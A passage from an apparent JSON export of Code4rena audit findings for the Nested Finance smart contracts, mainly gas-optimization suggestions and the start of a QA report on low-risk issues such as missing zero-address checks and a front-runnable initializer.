tokens[i];](\u201chttps://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/NestedFactory.sol#L257\u201d)   4. These arithmetic operations can be unchecked. a. [ uint256 halfInvestment = investmentA / 2;](\u201chttps://github.com/code-423n4/2022-06-nested/blob/main/contracts/operators/Beefy/lp/BeefyZapBiswapLPVaultOperator.sol#L275\u201d) b. [uint256 halfInvestment = investmentA / 2;](\u201chttps://github.com/code-423n4/2022-06-nested/blob/main/contracts/operators/Beefy/lp/BeefyZapUniswapLPVaultOperator.sol#L273\u201d)   5. This line could be pre-computed and defined as a constant to save gas. a. [bytes4(keccak256(bytes(\"remove_liquidity_one_coin(uint256,int128,uint256)\")))](\u201chttps://github.com/code-423n4/2022-06-nested/blob/main/contracts/libraries/StakingLPVaultHelpers.sol#L105\u201d) b. [bytes4(keccak256(bytes(\"remove_liquidity_one_coin(uint256,uint256,uint256)\")))](\u201chttps://github.com/code-423n4/2022-06-nested/blob/main/contracts/libraries/StakingLPVaultHelpers.sol#L135\u201d) "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nested-findings/issues/63", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "valid"], "target": "2022-06-nested-findings", "body": "## State variables that could be set immutable  In the following files there are state variables that could be set immutable to save gas.   ### Code instance:          operator in TestableOperatorCaller.sol    ## Unused state variables  Unused state variables are gas consuming at deployment (since they are located in storage) and are  a bad code practice. Removing those variables will decrease deployment gas cost and improve code quality.  This is a full list of all the unused storage variables we found in your code base.   ### Code instances:          WETHMock.sol, symbol         WETHMock.sol, decimals         TestableMixingOperatorResolver.sol, addressesToCache         WETHMock.sol, name    ## Unused declared local variables  Unused local variables are gas consuming, since the initial value assignment costs gas. And are  a bad code practice. Removing those variables will decrease the gas cost and improve code quality.  This is a full list of all the unused storage variables we found in your code base.   ### Code instances:          NestedAssetBatcher.sol, getNfts, amounts         NestedAssetBatcher.sol, getNfts, nftAssets         TestableOperatorCaller.sol, performSwap, data    ## Unnecessary array boundaries check when loading an array element twice       There are places in the code (especially in for-each loops) that loads the same array element more than once.      In such cases, only one array boundaries check should take place, and the rest are unnecessary.     Therefore, this array element should be cached in a local variable and then be loaded     again using this local variable, skipping the redundant second array boundaries check:       ### Code instances:          NestedFactory.sol._processOutputOrders - double load of _batchedOrders[i]         NestedFactory.sol._processInputOrders - double load of _batchedOrders[i]    ## Caching array length can save gas   Caching the array length is more gas efficient. This is because access to a local variable in solidity is more efficient than query storage / calldata / memory. We recommend to change from:          for (uint256 i=0; i<array.length; i++) { ... }  to:       uint len = array.length       for (uint256 i=0; i<len; i++) { ... }   ### Code instances:          MixinOperatorResolver.sol, requiredOperators, 56         OperatorResolver.sol, destinations, 75         MixinOperatorResolver.sol, requiredOperators, 37         FeeSplitter.sol, _tokens, 147         TimelockControllerEmergency.sol, targets, 234         FeeSplitter.sol, shareholders, 316         TimelockControllerEmergency.sol, targets, 324         NestedFactory.sol, _batchedOrders, 651         FeeSplitter.sol, _tokens, 164         TimelockControllerEmergency.sol, proposers, 84         OperatorResolver.sol, names, 60         TimelockControllerEmergency.sol, executors, 89         NestedFactory.sol, operatorsCache, 124         FeeSplitter.sol, shareholdersCache, 278         FeeSplitter.sol, shareholders, 259    ## Prefix increments are cheaper than postfix increments  Prefix increments are cheaper than postfix increments.  Further more, using unchecked {++x} is even more gas efficient, and the gas saving accumulates every iteration and can make a real change There is no risk of overflow caused by increamenting the iteration index in for loops (the `++i` in `for (uint256 i = 0; i < numIterations; ++i)`). But increments perform overflow checks that are not necessary in this case. These functions use not using prefix increments (`++x`) or not using the unchecked keyword:   ### Code instances:          change to prefix increment and unchecked: OperatorScripts.sol, i, 67         change to prefix increment and unchecked: OperatorScripts.sol, i, 80         change to prefix increment and unchecked: FeeSplitter.sol, i, 278         change to prefix increment and unchecked: MixinOperatorResolver.sol, i, 56    ## Unnecessary index init   In for loops you initialize the index to start from 0, but it already initialized to 0 in default and this assignment cost gas.  It is more clear and gas efficient to declare without assigning 0 and will have the same meaning:  ### Code instances:          NestedFactory.sol, 315         OperatorResolver.sol, 75         NestedFactory.sol, 333         NestedFactory.sol, 196         FeeSplitter.sol, 259    ## Rearrange state variables  You can change the order of the storage variables to decrease memory uses.  ### Code instance:  In OwnableProxyDelegation.sol,rearranging the storage fields can optimize to: 2 slots from: 3 slots. The new order of types (you choose the actual variables):         1. bytes32         2. address         3. bool     ## Use bytes32 instead of string to save gas whenever possible       Use bytes32 instead of string to save gas whenever possible.     String is a dynamic data structure and therefore is more gas consuming then bytes32.       ### Code instances:          WETHMock.sol (L25), string public symbol = \"WETH\";         WETHMock.sol (L24), string public name = \"Wrapped Ether\";    ## Short the following require messages  The following require messages are of length more than 32 and we think are short enough to short them into exactly 32 characters such that it will be placed in one slot of memory and the require  function will cost less gas.  The list:   ### Code instances:          Solidity file: TimelockControllerEmergency.sol, In line 320, Require message length to shorten: 35, The message: TimelockController: length mismatch         Solidity file: TimelockControllerEmergency.sol, In line 244, Require message length to shorten: 38, The message: TimelockController: insufficient delay         Solidity file: TimelockControllerEmergency.sol, In line 229, Require message length to shorten: 35, The message: TimelockController: length mismatch         Solidity file: TimelockControllerEmergency.sol, In line 335, Require message length to shorten: 38, The message: TimelockController: missing dependency         Solidity file: TimelockControllerEmergency.sol, In line 319, Require message length to shorten: 35, The message: TimelockController: length mismatch         Solidity file: TimelockControllerEmergency.sol, In line 230, Require message length to shorten: 35, The message: TimelockController: length mismatch    ## Use != 0 instead of > 0   Using != 0 is slightly cheaper than > 0. (see https://github.com/code-423n4/2021-12-maple-findings/issues/75 for similar issue)   ### Code instances:          WETHMock.sol, 71: change 'balance > 0' to 'balance != 0'         NestedFactory.sol, 544: change 'balance > 0' to 'balance != 0'         WETHMock.sol, 46: change 'balance > 0' to 'balance != 0'    ## Unnecessary cast        ### Code instance:          IERC20 DummyRouter.sol.dummyswapToken - unnecessary casting IERC20(_inputToken)    ## Use unchecked to save gas for certain additive calculations that cannot overflow   You can use unchecked in the following calculations since there is no risk to overflow:  ### Code instance:          TimelockControllerEmergency.sol (L#245) - _timestamps[id] = block.timestamp + delay;    ## Empty else statement can be removed to save gas           Empty else statement can be removed to save gas.               ### Code instance:          StakingLPVaultHelpers.sol._addLiquidityAndDepositETH    ## Empty else if statement can be removed to save gas           Empty else if statement can be removed to save gas by simply doing the following:                  if (a) {             some code 1         }         else if (b) {             empty         } else {             some code 2         }                  change this pattern to:         if (a) {             some code 1         }         else if (!b) {             some code 2         }                ### Code instance:          StakingLPVaultHelpers.sol._addLiquidityAndDepositETH    ## Consider inline the following functions to save gas       You can inline the following functions instead of writing a specific function to save gas.     (see https://github.com/code-423n4/2021-11-nested-findings/issues/167 for a similar issue.)               NestedAsset.sol, _baseURI, { return baseUri; }    ## Inline one time use functions   The following functions are used exactly once. Therefore you can inline them and save gas and improve code clearness.       ### Code instances:          BeefyZapUniswapLPVaultOperator.sol, _swapAndAddLiquidity         MixinOperatorResolver.sol, requireAndGetAddress         NestedBuybacker.sol, trigger         BeefyZapBiswapLPVaultOperator.sol, _swapAndAddLiquidity         ExchangeHelpers.sol, setMaxAllowance         FeeSplitter.sol, _addShareholder         BeefyZapUniswapLPVaultOperator.sol, _zapAndStakeLp         BeefyZapUniswapLPVaultOperator.sol, _withdrawAndSwap         BeefyZapBiswapLPVaultOperator.sol, _zapAndStakeLp         BeefyZapBiswapLPVaultOperator.sol, _withdrawAndSwap   "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nested-findings/issues/62", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "valid"], "target": "2022-06-nested-findings", "body": "**Table of Contents:**  - [1. Cheap Contract Deployment Through Clones](#1-cheap-contract-deployment-through-clones) - [2. Reduce the size of error messages (Long revert Strings)](#2-reduce-the-size-of-error-messages-long-revert-strings) - [3. Splitting `require()` statements that use `&&` saves gas](#3-splitting-require-statements-that-use--saves-gas) - [4. Using private rather than public for constants saves gas](#4-using-private-rather-than-public-for-constants-saves-gas) - [5. Use shift right/left instead of division/multiplication if possible](#5-use-shift-rightleft-instead-of-divisionmultiplication-if-possible) - [6. `<array>.length` should not be looked up in every loop of a `for-loop`](#6-arraylength-should-not-be-looked-up-in-every-loop-of-a-for-loop) - [7. `++i` costs less gas compared to `i++` or `i += 1` (same for `--i` vs `i--` or `i -= 1`)](#7-i-costs-less-gas-compared-to-i-or-i--1-same-for---i-vs-i---or-i---1) - [8. Increments/decrements can be unchecked in for-loops](#8-incrementsdecrements-can-be-unchecked-in-for-loops) - [9. It costs more gas to initialize variables with their default value than letting the default value be applied](#9-it-costs-more-gas-to-initialize-variables-with-their-default-value-than-letting-the-default-value-be-applied) - [10. Use Custom Errors instead of Revert Strings to save Gas](#10-use-custom-errors-instead-of-revert-strings-to-save-gas) - [11. Functions guaranteed to revert when called by normal users can be marked `payable`](#11-functions-guaranteed-to-revert-when-called-by-normal-users-can-be-marked-payable)  ## 1. Cheap Contract Deployment Through Clones  ```solidity operators/Beefy/lp/BeefyZapBiswapLPVaultOperator.sol:25:        operatorStorage = new BeefyVaultStorage(); operators/Beefy/lp/BeefyZapUniswapLPVaultOperator.sol:25:        operatorStorage = new BeefyVaultStorage(); operators/Yearn/YearnCurveVaultOperator.sol:40:        operatorStorage = new YearnVaultStorage(); ```  There's a way to save a significant amount of gas on deployment using Clones: <https://www.youtube.com/watch?v=3Mw-pMmJ7TA> .  This is a solution that was adopted, as an example, by Porter Finance. They realized that deploying using clones was 10x cheaper:  - <https://github.com/porter-finance/v1-core/issues/15#issuecomment-1035639516> - <https://github.com/porter-finance/v1-core/pull/34>  I suggest applying a similar pattern.  ## 2. Reduce the size of error messages (Long revert Strings)  Shortening revert strings to fit in 32 bytes will decrease deployment time gas and will decrease runtime gas when the revert condition is met.  Revert strings that are longer than 32 bytes require at least one additional mstore, along with additional overhead for computing memory offset, etc.  Revert strings > 32 bytes:  ```solidity governance/TimelockControllerEmergency.sol:229:        require(targets.length == values.length, \"TimelockController: length mismatch\"); governance/TimelockControllerEmergency.sol:230:        require(targets.length == datas.length, \"TimelockController: length mismatch\"); governance/TimelockControllerEmergency.sol:243:        require(!isOperation(id), \"TimelockController: operation already scheduled\"); governance/TimelockControllerEmergency.sol:244:        require(delay >= getMinDelay(), \"TimelockController: insufficient delay\"); governance/TimelockControllerEmergency.sol:256:        require(isOperationPending(id), \"TimelockController: operation cannot be cancelled\"); governance/TimelockControllerEmergency.sol:319:        require(targets.length == values.length, \"TimelockController: length mismatch\"); governance/TimelockControllerEmergency.sol:320:        require(targets.length == datas.length, \"TimelockController: length mismatch\"); governance/TimelockControllerEmergency.sol:334:        require(isOperationReady(id), \"TimelockController: operation is not ready\"); governance/TimelockControllerEmergency.sol:335:        require(predecessor == bytes32(0) || isOperationDone(predecessor), \"TimelockController: missing dependency\"); governance/TimelockControllerEmergency.sol:342:        require(isOperationReady(id), \"TimelockController: operation is not ready\"); governance/TimelockControllerEmergency.sol:359:        require(success, \"TimelockController: underlying transaction reverted\"); governance/TimelockControllerEmergency.sol:375:        require(msg.sender == address(this), \"TimelockController: caller must be timelock\"); ```  I suggest shortening the revert strings to fit in 32 bytes.  ## 3. Splitting `require()` statements that use `&&` saves gas  If you're using the Optimizer at 200, instead of using the `&&` operator in a single require statement to check multiple conditions, I suggest using multiple require statements with 1 condition per require statement:  ```solidity operators/Beefy/lp/BeefyZapBiswapLPVaultOperator.sol:64:        require(vaultAmount != 0 && vaultAmount >= minVaultAmount, \"BLVO: INVALID_AMOUNT_RECEIVED\"); operators/Beefy/lp/BeefyZapBiswapLPVaultOperator.sol:65:        require(depositedAmount != 0 && amountToDeposit >= depositedAmount, \"BLVO: INVALID_AMOUNT_DEPOSITED\"); operators/Beefy/lp/BeefyZapUniswapLPVaultOperator.sol:64:        require(vaultAmount != 0 && vaultAmount >= minVaultAmount, \"BLVO: INVALID_AMOUNT_RECEIVED\"); operators/Beefy/lp/BeefyZapUniswapLPVaultOperator.sol:65:        require(depositedAmount != 0 && amountToDeposit >= depositedAmount, \"BLVO: INVALID_AMOUNT_DEPOSITED\"); operators/Beefy/BeefyVaultOperator.sol:54:        require(vaultAmount != 0 && vaultAmount >= minVaultAmount, \"BVO: INVALID_AMOUNT_RECEIVED\"); operators/Paraswap/ParaswapOperator.sol:16:        require(_tokenTransferProxy != address(0) && _augustusSwapper != address(0), \"PSO: INVALID_ADDRESS\"); NestedFactory.sol:67:            address(_nestedAsset) != address(0) && NestedFactory.sol:68:                address(_nestedRecords) != address(0) && NestedFactory.sol:69:                address(_reserve) != address(0) && NestedFactory.sol:70:                address(_feeSplitter) != address(0) && NestedFactory.sol:71:                address(_weth) != address(0) && NestedFactory.sol:72:                _operatorResolver != address(0) && ```  Please, note that this might not hold true at a higher number of runs for the Optimizer (10k). However, it indeed is true at 200.  ## 4. Using private rather than public for constants saves gas  If needed, the value can be read from the verified contract source code. Savings are due to the compiler not having to create non-payable getter functions for deployment calldata, and not adding another entry to the method ID table  ```solidity governance/TimelockControllerEmergency.sol:25:    bytes32 public constant TIMELOCK_ADMIN_ROLE = keccak256(\"TIMELOCK_ADMIN_ROLE\"); governance/TimelockControllerEmergency.sol:26:    bytes32 public constant PROPOSER_ROLE = keccak256(\"PROPOSER_ROLE\"); governance/TimelockControllerEmergency.sol:27:    bytes32 public constant EXECUTOR_ROLE = keccak256(\"EXECUTOR_ROLE\"); governance/TimelockControllerEmergency.sol:28:    bytes32 public constant EMERGENCY_ROLE = keccak256(\"EMERGENCY_ROLE\");  ```  ## 5. Use shift right/left instead of division/multiplication if possible  While the `DIV` / `MUL` opcode uses 5 gas, the `SHR` / `SHL` opcode only uses 3 gas. Furthermore, beware that Solidity's division operation also includes a division-by-0 prevention which is bypassed using shifting. Eventually, overflow checks are never performed for shift operations as they are done for arithmetic operations. Instead, the result is always truncated.  - Use `>> 1` instead of `/ 2` - Use `>> 2` instead of `/ 4` - Use `<< 3` instead of `* 8`  Affected code:  ```solidity operators/Beefy/lp/BeefyZapBiswapLPVaultOperator.sol:275:        uint256 halfInvestment = investmentA / 2; operators/Beefy/lp/BeefyZapUniswapLPVaultOperator.sol:273:        uint256 halfInvestment = investmentA / 2; ```  ## 6. `<array>.length` should not be looked up in every loop of a `for-loop`  Reading array length at each iteration of the loop consumes more gas than necessary.    In the best case scenario (length read on a memory variable), caching the array length in the stack saves around 3 gas per iteration. In the worst case scenario (external calls at each iteration), the amount of gas wasted can be massive.  Here, I suggest storing the array's length in a variable before the for-loop, and use this new variable instead:  ```solidity abstracts/MixinOperatorResolver.sol:37:        for (uint256 i = 0; i < requiredOperators.length; i++) { abstracts/MixinOperatorResolver.sol:56:        for (uint256 i = 0; i < requiredOperators.length; i++) { governance/TimelockControllerEmergency.sol:84:        for (uint256 i = 0; i < proposers.length; ++i) { governance/TimelockControllerEmergency.sol:89:        for (uint256 i = 0; i < executors.length; ++i) { governance/TimelockControllerEmergency.sol:234:        for (uint256 i = 0; i < targets.length; ++i) { governance/TimelockControllerEmergency.sol:324:        for (uint256 i = 0; i < targets.length; ++i) { NestedFactory.sol:124:        for (uint256 i = 0; i < operatorsCache.length; i++) { NestedFactory.sol:651:        for (uint256 i = 0; i < _batchedOrders.length; i++) { OperatorResolver.sol:60:        for (uint256 i = 0; i < names.length; i++) { OperatorResolver.sol:75:        for (uint256 i = 0; i < destinations.length; i++) { ```  ## 7. `++i` costs less gas compared to `i++` or `i += 1` (same for `--i` vs `i--` or `i -= 1`)  Pre-increments and pre-decrements are cheaper.  For a `uint256 i` variable, the following is true with the Optimizer enabled at 10k:  **Increment:**  - `i += 1` is the most expensive form - `i++` costs 6 gas less than `i += 1` - `++i` costs 5 gas less than `i++` (11 gas less than `i += 1`)  **Decrement:**  - `i -= 1` is the most expensive form - `i--` costs 11 gas less than `i -= 1` - `--i` costs 5 gas less than `i--` (16 gas less than `i -= 1`)  Note that post-increments (or post-decrements) return the old value before incrementing or decrementing, hence the name *post-increment*:  ```solidity uint i = 1;   uint j = 2; require(j == i++, \"This will be false as i is incremented after the comparison\"); ```    However, pre-increments (or pre-decrements) return the new value:    ```solidity uint i = 1;   uint j = 2; require(j == ++i, \"This will be true as i is incremented before the comparison\"); ```    In the pre-increment case, the compiler has to create a temporary variable (when used) for returning `1` instead of `2`.      Affected code:    ```solidity abstracts/MixinOperatorResolver.sol:37:        for (uint256 i = 0; i < requiredOperators.length; i++) { abstracts/MixinOperatorResolver.sol:56:        for (uint256 i = 0; i < requiredOperators.length; i++) { governance/scripts/OperatorScripts.sol:67:        for (uint256 i; i < operatorLength; i++) { governance/scripts/OperatorScripts.sol:80:        for (uint256 i; i < operatorLength; i++) { libraries/CurveHelpers/CurveHelpers.sol:22:        for (uint256 i; i < 2; i++) { libraries/CurveHelpers/CurveHelpers.sol:42:        for (uint256 i; i < 3; i++) { libraries/CurveHelpers/CurveHelpers.sol:62:        for (uint256 i; i < 4; i++) { libraries/CurveHelpers/CurveHelpers.sol:86:        for (uint256 i; i < poolCoinAmount; i++) { operators/Beefy/lp/BeefyZapBiswapLPVaultOperator.sol:27:        for (uint256 i; i < vaultsLength; i++) { operators/Beefy/lp/BeefyZapUniswapLPVaultOperator.sol:27:        for (uint256 i; i < vaultsLength; i++) { operators/Beefy/BeefyVaultOperator.sol:18:        for (uint256 i; i < vaultsLength; i++) { operators/Yearn/YearnCurveVaultOperator.sol:42:        for (uint256 i; i < vaultsLength; i++) { utils/NestedAssetBatcher.sol:45:            for (uint256 i; i < numTokens; i++) { utils/NestedAssetBatcher.sol:60:            for (uint256 i; i < numTokens; i++) { utils/NestedAssetBatcher.sol:74:            for (uint256 i; i < numTokens; i++) { utils/NestedAssetBatcher.sol:79:                for (uint256 j; j < tokenLength; j++) { NestedFactory.sol:124:        for (uint256 i = 0; i < operatorsCache.length; i++) { NestedFactory.sol:136:        for (uint256 i = 0; i < operatorsLength; i++) { NestedFactory.sol:196:        for (uint256 i = 0; i < batchedOrdersLength; i++) { NestedFactory.sol:256:        for (uint256 i = 0; i < tokensLength; i++) { NestedFactory.sol:315:        for (uint256 i = 0; i < batchedOrdersLength; i++) { NestedFactory.sol:333:        for (uint256 i = 0; i < batchedOrdersLength; i++) { NestedFactory.sol:369:        for (uint256 i = 0; i < batchLength; i++) { NestedFactory.sol:412:        for (uint256 i = 0; i < batchLength; i++) { NestedFactory.sol:651:        for (uint256 i = 0; i < _batchedOrders.length; i++) { OperatorResolver.sol:40:        for (uint256 i = 0; i < namesLength; i++) { OperatorResolver.sol:60:        for (uint256 i = 0; i < names.length; i++) { OperatorResolver.sol:75:        for (uint256 i = 0; i < destinations.length; i++) { ```  Consider using pre-increments and pre-decrements where they are relevant (meaning: not where post-increments/decrements logic are relevant).  ## 8. Increments/decrements can be unchecked in for-loops  In Solidity 0.8+, there's a default overflow check on unsigned integers. It's possible to uncheck this in for-loops and save some gas at each iteration, but at the cost of some code readability, as this uncheck cannot be made inline.      [ethereum/solidity#10695](https://github.com/ethereum/solidity/issues/10695)  Affected code:    ```solidity abstracts/MixinOperatorResolver.sol:37:        for (uint256 i = 0; i < requiredOperators.length; i++) { abstracts/MixinOperatorResolver.sol:56:        for (uint256 i = 0; i < requiredOperators.length; i++) { governance/scripts/OperatorScripts.sol:67:        for (uint256 i; i < operatorLength; i++) { governance/scripts/OperatorScripts.sol:80:        for (uint256 i; i < operatorLength; i++) { governance/TimelockControllerEmergency.sol:84:        for (uint256 i = 0; i < proposers.length; ++i) { governance/TimelockControllerEmergency.sol:89:        for (uint256 i = 0; i < executors.length; ++i) { governance/TimelockControllerEmergency.sol:234:        for (uint256 i = 0; i < targets.length; ++i) { governance/TimelockControllerEmergency.sol:324:        for (uint256 i = 0; i < targets.length; ++i) { libraries/CurveHelpers/CurveHelpers.sol:22:        for (uint256 i; i < 2; i++) { libraries/CurveHelpers/CurveHelpers.sol:42:        for (uint256 i; i < 3; i++) { libraries/CurveHelpers/CurveHelpers.sol:62:        for (uint256 i; i < 4; i++) { libraries/CurveHelpers/CurveHelpers.sol:86:        for (uint256 i; i < poolCoinAmount; i++) { operators/Beefy/lp/BeefyZapBiswapLPVaultOperator.sol:27:        for (uint256 i; i < vaultsLength; i++) { operators/Beefy/lp/BeefyZapUniswapLPVaultOperator.sol:27:        for (uint256 i; i < vaultsLength; i++) { operators/Beefy/BeefyVaultOperator.sol:18:        for (uint256 i; i < vaultsLength; i++) { operators/Yearn/YearnCurveVaultOperator.sol:42:        for (uint256 i; i < vaultsLength; i++) { utils/NestedAssetBatcher.sol:45:            for (uint256 i; i < numTokens; i++) { utils/NestedAssetBatcher.sol:60:            for (uint256 i; i < numTokens; i++) { utils/NestedAssetBatcher.sol:74:            for (uint256 i; i < numTokens; i++) { utils/NestedAssetBatcher.sol:79:                for (uint256 j; j < tokenLength; j++) { NestedFactory.sol:124:        for (uint256 i = 0; i < operatorsCache.length; i++) { NestedFactory.sol:136:        for (uint256 i = 0; i < operatorsLength; i++) { NestedFactory.sol:196:        for (uint256 i = 0; i < batchedOrdersLength; i++) { NestedFactory.sol:256:        for (uint256 i = 0; i < tokensLength; i++) { NestedFactory.sol:315:        for (uint256 i = 0; i < batchedOrdersLength; i++) { NestedFactory.sol:333:        for (uint256 i = 0; i < batchedOrdersLength; i++) { NestedFactory.sol:369:        for (uint256 i = 0; i < batchLength; i++) { NestedFactory.sol:412:        for (uint256 i = 0; i < batchLength; i++) { NestedFactory.sol:651:        for (uint256 i = 0; i < _batchedOrders.length; i++) { OperatorResolver.sol:40:        for (uint256 i = 0; i < namesLength; i++) { OperatorResolver.sol:60:        for (uint256 i = 0; i < names.length; i++) { OperatorResolver.sol:75:        for (uint256 i = 0; i < destinations.length; i++) { ```  The change would be:      ```diff - for (uint256 i; i < numIterations; i++) { + for (uint256 i; i < numIterations;) {  // ...   +   unchecked { ++i; } }   ```  The same can be applied with decrements (which should use `break` when `i == 0`).  The risk of overflow is non-existant for `uint256` here.  ## 9. It costs more gas to initialize variables with their default value than letting the default value be applied  If a variable is not set/initialized, it is assumed to have the default value (`0` for `uint`, `false` for `bool`, `address(0)` for address...). Explicitly initializing it with its default value is an anti-pattern and wastes gas.  As an example: `for (uint256 i = 0; i < numIterations; ++i) {` should be replaced with `for (uint256 i; i < numIterations; ++i) {`  Affected code:  ```solidity abstracts/MixinOperatorResolver.sol:37:        for (uint256 i = 0; i < requiredOperators.length; i++) { abstracts/MixinOperatorResolver.sol:56:        for (uint256 i = 0; i < requiredOperators.length; i++) { governance/TimelockControllerEmergency.sol:84:        for (uint256 i = 0; i < proposers.length; ++i) { governance/TimelockControllerEmergency.sol:89:        for (uint256 i = 0; i < executors.length; ++i) { governance/TimelockControllerEmergency.sol:234:        for (uint256 i = 0; i < targets.length; ++i) { governance/TimelockControllerEmergency.sol:324:        for (uint256 i = 0; i < targets.length; ++i) { NestedFactory.sol:124:        for (uint256 i = 0; i < operatorsCache.length; i++) { NestedFactory.sol:136:        for (uint256 i = 0; i < operatorsLength; i++) { NestedFactory.sol:196:        for (uint256 i = 0; i < batchedOrdersLength; i++) { NestedFactory.sol:256:        for (uint256 i = 0; i < tokensLength; i++) { NestedFactory.sol:315:        for (uint256 i = 0; i < batchedOrdersLength; i++) { NestedFactory.sol:333:        for (uint256 i = 0; i < batchedOrdersLength; i++) { NestedFactory.sol:369:        for (uint256 i = 0; i < batchLength; i++) { NestedFactory.sol:412:        for (uint256 i = 0; i < batchLength; i++) { NestedFactory.sol:651:        for (uint256 i = 0; i < _batchedOrders.length; i++) { OperatorResolver.sol:40:        for (uint256 i = 0; i < namesLength; i++) { OperatorResolver.sol:60:        for (uint256 i = 0; i < names.length; i++) { OperatorResolver.sol:75:        for (uint256 i = 0; i < destinations.length; i++) { ```  I suggest removing explicit initializations for default values.  ## 10. Use Custom Errors instead of Revert Strings to save Gas  Solidity 0.8.4 introduced custom errors. They are more gas efficient than revert strings, when it comes to deploy cost as well as runtime cost when the revert condition is met. Use custom errors instead of revert strings for gas savings.  Custom errors from Solidity 0.8.4 are cheaper than revert strings (cheaper deployment cost and runtime cost when the revert condition is met)  Source: <https://blog.soliditylang.org/2021/04/21/custom-errors/>: > Starting from [Solidity v0.8.4](https://github.com/ethereum/solidity/releases/tag/v0.8.4), there is a convenient and gas-efficient way to explain to users why an operation failed through the use of custom errors. Until now, you could already use strings to give more information about failures (e.g., `revert(\"Insufficient funds.\");`), but they are rather expensive, especially when it comes to deploy cost, and it is difficult to use dynamic information in them.  Custom errors are defined using the `error` statement, which can be used inside and outside of contracts (including interfaces and libraries).  Consider replacing all revert strings with custom errors in the solution.  ```sol"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nested-findings/issues/61", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "valid"], "target": "2022-06-nested-findings", "body": "**Overview** Risk Rating | Number of issues --- | --- Low Risk | 6 Non-Critical Risk | 4  **Table of Contents**  - [Low Risk Issues](#low-risk-issues)   - [1. Known vulnerabilities exist in currently used `@openzeppelin/contracts` version](#1-known-vulnerabilities-exist-in-currently-used-openzeppelincontracts-version)   - [2. Missing address(0) checks](#2-missing-address0-checks)   - [3. `OwnableProxyDelegation.initialize()` is front-runnable in the solution](#3-ownableproxydelegationinitialize-is-front-runnable-in-the-solution)   - [4. Use a `constant` instead of duplicating the same string](#4-use-a-constant-instead-of-duplicating-the-same-string)   - [5. Funds can be locked](#5-funds-can-be-locked)   - [6. A magic number should be documented and explained. Use a `constant` instead](#6-a-magic-number-should-be-documented-and-explained-use-a-constant-instead) - [Non-Critical Issues](#non-critical-issues)   - [1. It's better to emit after all processing is done](#1-its-better-to-emit-after-all-processing-is-done)   - [2. Typos](#2-typos)   - [3. Adding a `return` statement when the function defines a named return variable, is redundant](#3-adding-a-return-statement-when-the-function-defines-a-named-return-variable-is-redundant)   - [4. `public` functions not called by the contract should be declared `external` instead](#4-public-functions-not-called-by-the-contract-should-be-declared-external-instead)  # Low Risk Issues  ## 1. Known vulnerabilities exist in currently used `@openzeppelin/contracts` version  As some [known vulnerabilities](https://snyk.io/test/npm/@openzeppelin/contracts/4.3.2) exist in the current `@openzeppelin/contracts` version, consider updating `package.json` with at least `@openzeppelin/contracts@4.4.2` here:  <https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/package.json#L65>  ```json         \"@openzeppelin/contracts\": \"^4.3.2\", ```  While vulnerabilities are known, the current scope isn't affected (this might not hold true for the whole solution)  ## 2. Missing address(0) checks  Consider adding an `address(0)` check for immutable variables:  ```solidity operators/Yearn/YearnCurveVaultOperator.sol:23:    address public immutable eth; operators/Yearn/YearnCurveVaultOperator.sol:26:    IWETH private immutable weth; operators/Yearn/YearnCurveVaultOperator.sol:29:    Withdrawer private immutable withdrawer; utils/NestedAssetBatcher.sol:19:    INestedAsset public immutable nestedAsset; utils/NestedAssetBatcher.sol:20:    INestedRecords public immutable nestedRecords; Withdrawer.sol:14:    IWETH public immutable weth; ```  ## 3. `OwnableProxyDelegation.initialize()` is front-runnable in the solution  I suggest adding some access control or atomically initializing the contract:  <https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/abstracts/OwnableProxyDelegation.sol#L24-L32>  ```solidity File: OwnableProxyDelegation.sol 24:     function initialize(address ownerAddr) external { 25:         require(ownerAddr != address(0), \"OPD: INVALID_ADDRESS\"); 26:         require(!initialized, \"OPD: INITIALIZED\"); 27:         require(StorageSlot.getAddressSlot(_ADMIN_SLOT).value == msg.sender, \"OPD: FORBIDDEN\"); 28:  29:         _setOwner(ownerAddr); 30:  31:         initialized = true; 32:     } ```  ## 4. Use a `constant` instead of duplicating the same string  ```solidity abstracts/OwnableProxyDelegation.sol:25:        require(ownerAddr != address(0), \"OPD: INVALID_ADDRESS\"); abstracts/OwnableProxyDelegation.sol:57:        require(newOwner != address(0), \"OPD: INVALID_ADDRESS\"); ```  ```solidity governance/TimelockControllerEmergency.sol:229:        require(targets.length == values.length, \"TimelockController: length mismatch\"); governance/TimelockControllerEmergency.sol:230:        require(targets.length == datas.length, \"TimelockController: length mismatch\"); governance/TimelockControllerEmergency.sol:319:        require(targets.length == values.length, \"TimelockController: length mismatch\"); governance/TimelockControllerEmergency.sol:320:        require(targets.length == datas.length, \"TimelockController: length mismatch\"); ```  ```solidity governance/TimelockControllerEmergency.sol:334:        require(isOperationReady(id), \"TimelockController: operation is not ready\"); governance/TimelockControllerEmergency.sol:342:        require(isOperationReady(id), \"TimelockController: operation is not ready\"); ```  ```solidity libraries/CurveHelpers/CurveHelpers.sol:28:        revert(\"CH: INVALID_INPUT_TOKEN\"); libraries/CurveHelpers/CurveHelpers.sol:48:        revert(\"CH: INVALID_INPUT_TOKEN\"); libraries/CurveHelpers/CurveHelpers.sol:68:        revert(\"CH: INVALID_INPUT_TOKEN\"); ```  ```solidity libraries/StakingLPVaultHelpers.sol:108:        require(success, \"SDCSO: CURVE_RM_LIQUIDITY_FAILED\"); libraries/StakingLPVaultHelpers.sol:138:        require(success, \"SDCSO: CURVE_RM_LIQUIDITY_FAILED\"); ```  ```solidity operators/Beefy/lp/BeefyZapBiswapLPVaultOperator.sol:52:        require(amountToDeposit != 0, \"BLVO: INVALID_AMOUNT\"); operators/Beefy/lp/BeefyZapBiswapLPVaultOperator.sol:97:        require(amount != 0, \"BLVO: INVALID_AMOUNT\"); ```  ```solidity operators/Beefy/lp/BeefyZapBiswapLPVaultOperator.sol:54:        require(router != address(0), \"BLVO: INVALID_VAULT\"); operators/Beefy/lp/BeefyZapBiswapLPVaultOperator.sol:99:        require(router != address(0), \"BLVO: 